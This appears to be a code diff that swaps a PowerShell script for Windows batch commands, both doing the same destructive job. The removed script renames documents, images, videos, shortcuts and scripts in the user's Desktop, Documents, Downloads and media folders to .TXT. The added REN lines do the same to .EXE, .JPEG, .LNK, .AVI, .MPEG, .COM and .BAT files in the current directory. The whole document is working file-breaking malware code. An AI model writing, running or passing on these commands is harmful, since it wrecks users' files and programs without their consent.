@@ -1,22 +1,7 @@
-$directories = @(
-    [Environment]::GetFolderPath('Desktop'),
-    [Environment]::GetFolderPath('Music'),
-    [Environment]::GetFolderPath('Pictures'),
-    [Environment]::GetFolderPath('Videos'),
-    [Environment]::GetFolderPath('MyDocuments'),
-    [Environment]::GetFolderPath('Downloads')
-)
-
-$extensions = @('.DOC', '.JPEG', '.LNK', '.AVI', '.MPEG', '.COM', '.BAT')
-
-foreach ($directory in $directories) {
-    foreach ($extension in $extensions) {
-        $files = Get-ChildItem -Path $directory -Filter "*$extension" -File
-        foreach ($file in $files) {
-            $newName = $file.Name -replace "\$extension$", ".TXT"
-            $newPath = Join-Path -Path $directory -ChildPath $newName
-            Rename-Item -Path $file.FullName -NewName $newPath
-        }
-    }
-}
-
+REN *.EXE *.TXT 
+REN *.JPEG *.TXT
+REN *.LNK *.TXT
+REN *.AVI *.TXT
+REN *.MPEG *.TXT
+REN *.COM *.TXT
+REN *.BAT *.TXT
